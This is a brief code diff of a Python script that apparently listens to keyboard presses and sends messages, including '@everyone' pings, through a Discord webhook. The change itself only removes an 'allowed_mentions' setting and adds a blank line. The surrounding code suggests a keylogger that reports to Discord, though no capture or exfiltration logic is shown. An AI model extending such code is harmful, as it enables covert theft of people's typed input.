@@ -39,7 +39,6 @@ def send_discord_message(webhook_url, message):
     
 payload = {
     "content": "@everyone",
-    "allowed_mentions": {"parse": ["everyone"]}
 }
 
 #pings @everyone
@@ -108,4 +107,5 @@ def on_press(key):
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
 
